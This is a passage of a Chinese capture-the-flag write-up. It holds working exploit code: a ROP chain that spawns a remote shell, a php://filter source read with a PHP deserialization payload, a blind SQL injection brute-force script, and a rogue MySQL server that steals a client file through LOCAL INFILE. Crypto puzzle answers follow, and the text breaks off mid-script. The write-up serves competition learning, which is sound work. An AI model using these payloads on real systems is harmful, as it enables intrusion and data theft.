telnetlib</span><br><span class="line"></span><br><span class="line">def rop(path,offset,sock):</span><br><span class="line">	rop = ROP(path)</span><br><span class="line">	addr_bss = rop.section(&apos;.bss&apos;)</span><br><span class="line">	buf = rop.retfill(offset)</span><br><span class="line">	buf += rop.call(&apos;read&apos;, 0, addr_bss, 100)</span><br><span class="line">	buf += rop.dl_resolve_call(addr_bss+20, addr_bss)</span><br><span class="line">	p = Proc(rop.path)</span><br><span class="line">	sock.sendall(p32(len(buf)) + buf+&apos;\n&apos;)</span><br><span class="line">	buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">	buf += rop.fill(20, buf)</span><br><span class="line">	buf += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)</span><br><span class="line">	buf += rop.fill(100, buf)</span><br><span class="line">	return buf</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	s.connect((&apos;da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com&apos;,33865))</span><br><span class="line">	path=&apos;./pwn&apos;</span><br><span class="line">	ofs = 44</span><br><span class="line">	b = rop(path,ofs,s)</span><br><span class="line">	s.sendall(b)</span><br><span class="line">	tel = telnetlib.Telnet() </span><br><span class="line">	tel.sock = s</span><br><span class="line">	tel.interact()</span><br><span class="line"></span><br><span class="line">if &apos;__main__&apos; == __name__:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{3d08dff876024b6cf1bc938f4a46e5ef}</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x01-justsoso"><a href="#0x01-justsoso" class="headerlink" title="0x01  justsoso"></a>0x01  justsoso</h3><p>使用?file=php://filter/read=convert.base64-encode/resource=index.php读取index.php<br><figure class="image-box">
                <img src="./31.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<blockquote>
<p>PGh0bWw+DQo8P3BocA0KZXJyb3JfcmVwb3J0aW5nKDApOyANCiRmaWxlID0gJF9HRVRbImZpbGUiXTsgDQokcGF5bG9hZCA9ICRfR0VUWyJwYXlsb2FkIl07DQppZighaXNzZXQoJGZpbGUpKXsNCgllY2hvICdNaXNzaW5nIHBhcmFtZXRlcicuJzxicj4nOw0KfQ0KaWYocHJlZ19tYXRjaCgiL2ZsYWcvIiwkZmlsZSkpew0KCWRpZSgnaGFjayBhdHRhY2tlZCEhIScpOw0KfQ0KQGluY2x1ZGUoJGZpbGUpOw0KaWYoaXNzZXQoJHBheWxvYWQpKXsgIA0KICAgICR1cmwgPSBwYXJzZV91cmwoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pOw0KICAgIHBhcnNlX3N0cigkdXJsWydxdWVyeSddLCRxdWVyeSk7DQogICAgZm9yZWFjaCgkcXVlcnkgYXMgJHZhbHVlKXsNCiAgICAgICAgaWYgKHByZWdfbWF0Y2goIi9mbGFnLyIsJHZhbHVlKSkgeyANCiAgICAJICAgIGRpZSgnc3RvcCBoYWNraW5nIScpOw0KICAgIAkgICAgZXhpdCgpOw0KICAgICAgICB9DQogICAgfQ0KICAgICRwYXlsb2FkID0gdW5zZXJpYWxpemUoJHBheWxvYWQpOw0KfWVsc2V7IA0KICAgZWNobyAiTWlzc2luZyBwYXJhbWV0ZXJzIjsgDQp9IA0KPz4NCjwhLS1QbGVhc2UgdGVzdCBpbmRleC5waHA/ZmlsZT14eHgucGhwIC0tPg0KPCEtLVBsZWFzZSBnZXQgdGhlIHNvdXJjZSBvZiBoaW50LnBocC0tPg0KPC9odG1sPg==Missing parameters</p>
</blockquote>
<p>base64解码找到php代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); </span><br><span class="line">$file = $_GET[&quot;file&quot;]; </span><br><span class="line">$payload = $_GET[&quot;payload&quot;];</span><br><span class="line">if(!isset($file))&#123;</span><br><span class="line">	echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">	die(&apos;hack attacked!!!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">if(isset($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">    parse_str($url[&apos;query&apos;],$query);</span><br><span class="line">    foreach($query as $value)&#123;</span><br><span class="line">        if (preg_match(&quot;/flag/&quot;,$value)) &#123; </span><br><span class="line">    	    die(&apos;stop hacking!&apos;);</span><br><span class="line">    	    exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;else&#123; </span><br><span class="line">   echo &quot;Missing parameters&quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>根据提示使用?file=php://filter/read=convert.base64-encode/resource=hint.php<br>读取hint.php</p>
<blockquote>
<p>PD9waHAgIA0KY2xhc3MgSGFuZGxleyANCiAgICBwcml2YXRlICRoYW5kbGU7ICANCiAgICBwdWJsaWMgZnVuY3Rpb24gX193YWtldXAoKXsNCgkJZm9yZWFjaChnZXRfb2JqZWN0X3ZhcnMoJHRoaXMpIGFzICRrID0+ICR2KSB7DQogICAgICAgICAgICAkdGhpcy0+JGsgPSBudWxsOw0KICAgICAgICB9DQogICAgICAgIGVjaG8gIldha2luZyB1cFxuIjsNCiAgICB9DQoJcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRoYW5kbGUpIHsgDQogICAgICAgICR0aGlzLT5oYW5kbGUgPSAkaGFuZGxlOyANCiAgICB9IA0KCXB1YmxpYyBmdW5jdGlvbiBfX2Rlc3RydWN0KCl7DQoJCSR0aGlzLT5oYW5kbGUtPmdldEZsYWcoKTsNCgl9DQp9DQoNCmNsYXNzIEZsYWd7DQogICAgcHVibGljICRmaWxlOw0KICAgIHB1YmxpYyAkdG9rZW47DQogICAgcHVibGljICR0b2tlbl9mbGFnOw0KIA0KICAgIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRmaWxlKXsNCgkJJHRoaXMtPmZpbGUgPSAkZmlsZTsNCgkJJHRoaXMtPnRva2VuX2ZsYWcgPSAkdGhpcy0+dG9rZW4gPSBtZDUocmFuZCgxLDEwMDAwKSk7DQogICAgfQ0KICAgIA0KCXB1YmxpYyBmdW5jdGlvbiBnZXRGbGFnKCl7DQoJCSR0aGlzLT50b2tlbl9mbGFnID0gbWQ1KHJhbmQoMSwxMDAwMCkpOw0KICAgICAgICBpZigkdGhpcy0+dG9rZW4gPT09ICR0aGlzLT50b2tlbl9mbGFnKQ0KCQl7DQoJCQlpZihpc3NldCgkdGhpcy0+ZmlsZSkpew0KCQkJCWVjaG8gQGhpZ2hsaWdodF9maWxlKCR0aGlzLT5maWxlLHRydWUpOyANCiAgICAgICAgICAgIH0gIA0KICAgICAgICB9DQogICAgfQ0KfQ0KPz4=</p>
</blockquote>
<p>在线解码得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Handle&#123; </span><br><span class="line">    private $handle;  </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">		foreach(get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;$k = null;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;Waking up\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">	public function __construct($handle) &#123; </span><br><span class="line">        $this-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">	public function __destruct()&#123;</span><br><span class="line">		$this-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $token;</span><br><span class="line">    public $token_flag;</span><br><span class="line"> </span><br><span class="line">    function __construct($file)&#123;</span><br><span class="line">		$this-&gt;file = $file;</span><br><span class="line">		$this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	public function getFlag()&#123;</span><br><span class="line">		$this-&gt;token_flag = md5(rand(1,10000));</span><br><span class="line">        if($this-&gt;token === $this-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			if(isset($this-&gt;file))&#123;</span><br><span class="line">				echo @highlight_file($this-&gt;file,true); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>分析源码，初步认为是序列化漏洞，构造payload，我们发现用///可以绕过parse_str($url[‘query’],$query);<br>其中R是PointRepresentation<br>handle是受保护成员变量含有\0和*需要URL编码一下，然后检测到进入到__wakeup函数中，发现思路是对的。从而构建以下payload</p>
<blockquote>
<p>///?file=hint.php&amp;payload=O:6:”Handle”:2:{s:14:”%00Handle%00handle”;O:4:”Flag”:3:{s:4:”file”;s:8:”flag.php”;s:5:”token”;N;s:10:”token_flag”;R:4;}}}得到flag</p>
</blockquote>
<figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>参考文献：<a href="https://www.jianshu.com/p/be6de8511cb9" target="_blank" rel="noopener">https://www.jianshu.com/p/be6de8511cb9</a></p>
<h3 id="0x02-全宇宙最简单的sql"><a href="#0x02-全宇宙最简单的sql" class="headerlink" title="0x02  全宇宙最简单的sql"></a>0x02  全宇宙最简单的sql</h3><p>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=&quot;http://39.97.167.120:52105/&quot;</span><br><span class="line">c=&apos;&apos;</span><br><span class="line">for i in range(1,26):</span><br><span class="line">  for j in range(30,127):</span><br><span class="line">    data=&#123;</span><br><span class="line">      &apos;username&apos;:&quot;ciscn&apos;^1 and  (select ascii(mid((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1,1),%d,1))=%d from user) and pow(2,2222222)-- &quot;%(i,j),</span><br><span class="line">      &apos;password&apos;:&apos;1111&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    # print data</span><br><span class="line">    r=requests.post(url=url,data=data)</span><br><span class="line">    # print r.content</span><br><span class="line">    if &quot;数据库操作失败&quot; in r.content:</span><br><span class="line">      c=c+chr(j)</span><br><span class="line">      print c</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./17.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>得到一串字符：F1AG@1s-at_/fll1llag_h3r3<br>但是不是flag，他的意思是，flag在根目录/fll1llag_h3r3<br>查找资料得知可能需要利用MySQL LOCAL INFILE来读取客户端文件<br>通过服务端和客户端连接的握手，发送数据，从而得到文件，和前几天的DDCTF一样，又知道文件名和路径。<br>根据参考网站，直接在服务器上运行脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">HOST = &apos;39.97.167.120&apos;</span><br><span class="line">PORT = 3306</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">try:</span><br><span class="line">    s.bind((HOST, PORT))</span><br><span class="line">except socket.error, msg:</span><br><span class="line">    print msg[0], msg[1]</span><br><span class="line">    sys.exit()</span><br><span class="line">s.listen(10)</span><br><span class="line">#wait to accept a connection - blocking call</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">#now keep talking with the client</span><br><span class="line">MySQLGreeting = [</span><br><span class="line">0x5b, 0x00, 0x00, 0x00, 0x0a, 0x35, 0x2e, 0x36,</span><br><span class="line">0x2e, 0x32, 0x38, 0x2d, 0x30, 0x75, 0x62, 0x75,</span><br><span class="line">0x6e, 0x74, 0x75, 0x30, 0x2e, 0x31, 0x34, 0x2e,</span><br><span class="line">0x30, 0x34, 0x2e, 0x31, 0x00, 0x2d, 0x00, 0x00,</span><br><span class="line">0x00, 0x40, 0x3f, 0x59, 0x26, 0x4b, 0x2b, 0x34,</span><br><span class="line">0x60, 0x00, 0xff, 0xf7, 0x08, 0x02, 0x00, 0x7f,</span><br><span class="line">0x80, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">0x00, 0x00, 0x00, 0x00, 0x68, 0x69, 0x59, 0x5f,</span><br><span class="line">0x52, 0x5f, 0x63, 0x55, 0x60, 0x64, 0x53, 0x52,</span><br><span class="line">0x00, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x6e,</span><br><span class="line">0x61, 0x74, 0x69, 0x76, 0x65, 0x5f, 0x70, 0x61,</span><br><span class="line">0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x00]</span><br><span class="line">conn.send(&apos;&apos;.join(chr(i) for i in MySQLGreeting))</span><br><span class="line">data1 = conn.recv(1024)</span><br><span class="line">FirstResponseoK = [</span><br><span class="line">0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02,</span><br><span class="line">0x00, 0x00, 0x00]</span><br><span class="line">conn.send(&apos;&apos;.join(chr(i) for i in FirstResponseoK))</span><br><span class="line">data2 = conn.recv(1024)</span><br><span class="line">fname = &apos;/fll1llag_h3r3&apos;</span><br><span class="line">get_file = chr(len(fname) + 1) + &apos;\x00\x00\x01\xfb&apos; + fname</span><br><span class="line">conn.send(get_file)</span><br><span class="line">flag1= conn.recv(1024)</span><br><span class="line">SecondResponseoK = [</span><br><span class="line">0x07, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02,</span><br><span class="line">0x00, 0x00, 0x00]</span><br><span class="line">conn.send(&apos;&apos;.join(chr(i) for i in SecondResponseoK))</span><br><span class="line">flag2= conn.send(1024)</span><br><span class="line">print flag1,flag2</span><br><span class="line">conn.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure></p>
<p>参考链接：<a href="http://www.52bug.cn/hkjs/4843.html" target="_blank" rel="noopener">http://www.52bug.cn/hkjs/4843.html</a><br>flag{3f4abe8b-aa4a-bb48-c2f9f04d045beade} </p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="0x01-puzzles"><a href="#0x01-puzzles" class="headerlink" title="0x01  puzzles"></a>0x01  puzzles</h3><h4 id="question0"><a href="#question0" class="headerlink" title="question0"></a>question0</h4><p>网上找了一个四元一次方程组计算器<br><figure class="image-box">
                <img src="./18.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>a1 = 4006 a2 = 3053 a3 = 2503 a4 = 2560<br>a1 = 0xfa6 a2 = 0xbed a3 = 9c7 a4 = 0xa00<br>a1a2a3a4=<strong>fa6bed9c7a00</strong></p>
<h4 id="question-1"><a href="#question-1" class="headerlink" title="question 1"></a>question 1</h4><p>找规律，找素数<br>26364809 Part1 26366033 26366621<br>参考链接：<a href="http://smallprimenumber.blogspot.com/2008/12/prime-number-from-26000000-to-26500000.html" target="_blank" rel="noopener">http://smallprimenumber.blogspot.com/2008/12/prime-number-from-26000000-to-26500000.html</a>（直接把上面三个长整数丢进谷歌搜索就有这个链接）<br>26364809 到 26366033之间有73个素数，26366033到26366621之间有36个素数<br>刚好是第37个<br>part1 = 26365399 =0x<strong>1924dd7</strong></p>
<h4 id="question2"><a href="#question2" class="headerlink" title="question2"></a>question2</h4><figure class="image-box">
                <img src="./19.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>Part2 = (1+91+ 7 + 1  )x77=7700=0x<strong>1e14</strong></p>
<h4 id="question3"><a href="#question3" class="headerlink" title="question3"></a>question3</h4><figure class="image-box">
                <img src="./20.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>怼公式<br>电动势 = B2<em>πrdr/dt = 80 π</em><br>part3 = 233×80 = 18640=0x<strong>48d0</strong></p>
<h4 id="question4"><a href="#question4" class="headerlink" title="question4"></a>question4</h4><figure class="image-box">
                <img src="./21.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>part4=120*336=40320<br>=0x<strong>9d80</strong></p>
<p>flag{01924dd7-1e14-48d0-9d80-fa6bed9c7a00}</p>
<h3 id="0x02-SimpleDES"><a href="#0x02-SimpleDES" class="headerlink" title="0x02  SimpleDES"></a>0x02  SimpleDES</h3><p>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">Enc = [32, 1, 2, 3, 4, 5,</span><br><span class="line">        4, 5, 6, 7, 8, 9,</span><br><span class="line">        8, 9, 10, 11, 12, 13,</span><br><span class="line">        12, 13, 14, 15, 16, 17,</span><br><span class="line">        16, 17, 18, 19, 20, 21,</span><br><span class="line">        20, 21, 22, 23, 24, 25,</span><br><span class="line">        24, 25, 26, 27, 28, 29,</span><br><span class="line">        28, 29, 30, 31, 32, 1]</span><br><span class="line">SBES = [</span><br><span class="line">        [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7],</span><br><span class="line">            [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8],</span><br><span class="line">            [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0],</span><br><span class="line">            [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],</span><br><span class="line">            ],</span><br><span class="line">        [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10],</span><br><span class="line">            [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5],</span><br><span class="line">            [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15],</span><br><span class="line">            [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9],</span><br><span class="line">            ],</span><br><span class="line">        [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8],</span><br><span class="line">            [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1],</span><br><span class="line">            [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7],</span><br><span class="line">            [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12],</span><br><span class="line">            ],</span><br><span class="line">        [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15],</span><br><span class="line">            [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9],</span><br><span class="line">            [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4],</span><br><span class="line">            [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14],</span><br><span class="line">            ],  </span><br><span class="line">        [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9],</span><br><span class="line">            [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6],</span><br><span class="line">            [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14],</span><br><span class="line">            [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3],</span><br><span class="line">            ], </span><br><span class="line">        [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11],</span><br><span class="line">            [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8],</span><br><span class="line">            [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6],</span><br><span class="line">            [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13],</span><br><span class="line">            ], </span><br><span class="line">        [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1],</span><br><span class="line">            [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6],</span><br><span class="line">            [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2],</span><br><span class="line">            [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12],</span><br><span class="line">            ],</span><br><span class="line">        [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7],</span><br><span class="line">            [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2],</span><br><span class="line">            [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8],</span><br><span class="line">            [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11],</span><br><span class="line">            ]</span><br><span class="line">        ]</span><br><span class="line">P = [16, 7, 20, 21, 29, 12, 28, 17,</span><br><span class="line">        1, 15, 23, 26, 5, 18, 31, 10,</span><br><span class="line">        2, 8, 24, 14, 32, 27, 3, 9,</span><br><span class="line">        19, 13, 30, 6, 22, 11, 4, 25]</span><br><span class="line">PAI = [40, 8, 48, 16, 56, 24, 64, 32,</span><br><span class="line">        39, 7, 47, 15, 55, 23, 63, 31,</span><br><span class="line">        38, 6, 46, 14, 54, 22, 62, 30,</span><br><span class="line">        37, 5, 45, 13, 53, 21, 61, 29,</span><br><span class="line">        36, 4, 44, 12, 52, 20, 60, 28,</span><br><span class="line">        35, 3, 43, 11, 51, 19, 59, 27,</span><br><span class="line">        34, 2, 42, 10, 50, 18, 58, 26,</span><br><span class="line">        33, 1, 41, 9, 49, 17, 57, 25]</span><br><span class="line">def strToarr(txt):</span><br><span class="line">    arr = list()</span><br><span class="line">    for char in txt:</span><br><span class="line">        bvalue = b(char, 8)</span><br><span class="line">        arr.extend([int(x) for x in list(bvalue)])</span><br><span class="line">    return arr</span><br><span class="line">def arrTostr(arr): </span><br><span class="line">    r = &apos;&apos;.join([chr(int(y,2)) for y in [&apos;&apos;.join([str(x) for x in bytes]) for bytes in  nsp(arr,8)]])   </span><br><span class="line">    return r</span><br><span class="line">def b(val, size):</span><br><span class="line">    bvalue = bin(val)[2:] if isinstance(val, int) else bin(ord(val))[2:]</span><br><span class="line">    if len(bvalue) &gt; size:</span><br><span class="line">        raise &quot;binary value larger than the expected size&quot;</span><br><span class="line">    while len(bvalue) &lt; size:</span><br><span class="line">        bvalue = &quot;0&quot;+bvalue</span><br><span class="line">    return bvalue</span><br><span class="line">def nsp(s, n):</span><br><span class="line">    return [s[k:k+n] for k in xrange(0, len(s), n)]</span><br><span class="line">class SimpleDes():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.keys = list()</span><br><span class="line">    def test(self, aRound):</span><br><span class="line">        part_encode = &apos;92d915250119e12b&apos;.decode(&apos;hex&apos;)</span><br><span class="line">        key_map = &apos;e0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84&apos;.decode(&apos;hex&apos;)</span><br><span class="line">        keys = []</span><br><span class="line">        for i in range(16):</span><br><span class="line">            tipses = key_map[6*i: 6+6*i]</span><br><span class="line">            